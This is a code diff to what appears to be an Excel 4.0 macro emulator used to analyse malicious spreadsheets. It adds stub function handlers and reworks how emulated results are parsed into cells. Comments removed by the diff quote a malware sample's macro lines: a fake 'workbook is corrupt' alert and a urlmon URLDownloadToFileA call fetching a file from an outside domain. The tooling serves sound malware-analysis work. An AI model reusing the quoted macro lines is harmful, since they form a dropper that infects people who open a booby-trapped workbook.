@@ -158,6 +158,25 @@ def IF(params):
     return "IF"
 func_lookup["IF"] = IF
 
+def CLOSE(params):
+    r = "ACTION: CLOSE"
+    return r
+func_lookup["CLOSE"] = CLOSE
+
+def SEARCH(params):
+    r = "SEARCH"
+    return r
+func_lookup["SEARCH"] = SEARCH
+
+def ISNUMBER(params):
+    r = "ISNUMBER"
+    return r
+func_lookup["ISNUMBER"] = ISNUMBER
+
+def ALERT(params):
+    return "ACTION: OUTPUT:ALERT(" + str(params) + ")"
+func_lookup["ALERT"] = ALERT
+
 ####################################################################
 def eval(func_name, params, sheet):
     """
@@ -196,14 +215,12 @@ def eval(func_name, params, sheet):
 
     # Does this value get written to a cell?
     if (update_index is not None):
-        # TODO: r is something in the real XLM format. Need to parse real XLM to an
-        # XLM object.
-        #
-        # (7, 10)	=	'=ALERT("The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt.",2)'
-        # (7, 11)	=	'=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://rosannahtacey.xyz/vg43","c:\Users\Public\bmjn5ef.html",0,0)'
-        print("\n\n\nLOOK HERE!!\n\n\n\n\n\n\n")
-        new_item = XLM.stack_item.stack_str(str(r))
-        new_cell = XLM.XLM_Object.XLM_Object(update_index[0], update_index[1], [new_item])
+
+        # r is something in the real XLM format. Need to parse real XLM to an XLM object.
+        import XLM.ms_stack_transformer
+        new_cell = XLM.ms_stack_transformer.parse_ms_xlm(str(r))
+        new_cell.row = update_index[0]
+        new_cell.col = update_index[1]
         sheet.cells[update_index] = new_cell
         if (update_index not in sheet.xlm_cell_indices):
             sheet.xlm_cell_indices.append(update_index)
